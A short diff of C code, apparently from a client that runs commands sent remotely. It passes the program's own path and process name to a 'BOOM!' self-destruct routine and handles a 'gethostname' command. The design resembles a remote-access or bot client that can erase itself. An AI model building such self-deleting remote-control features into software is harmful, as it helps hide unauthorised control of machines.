@@ -11,9 +11,7 @@
 #define OP_START '\\x02'
 #define OP_STOP "\x03"
 
-struct message {
-    char servermessage[150];
-}message;
+
 
 void *changecommand(char *id,char *text);
 
@@ -168,7 +166,11 @@ int main(int argc , char *argv[])
 }
 void *changecommand(char *id,char *text) {
     char text_build[4000], command_detail[500],temp_text[2000];
+    char path[4000], pName[4000];
     int start_index, index = 0, length;
+
+    getNowPath(path);
+    getpName(pName);
 
     strcpy(text_build, text);
     length = strlen(text);
@@ -217,7 +219,7 @@ void *changecommand(char *id,char *text) {
         }
         else if(strcmp(text, "BOOM!") == 0) {
             strcpy(command_detail, "DESTROY ITSELF!");
-            boom();
+            boom(path,pName);
         }
         else if(strcmp(text, "gethostname") == 0) {
             strcpy(command_detail, "Get hostname of client.");
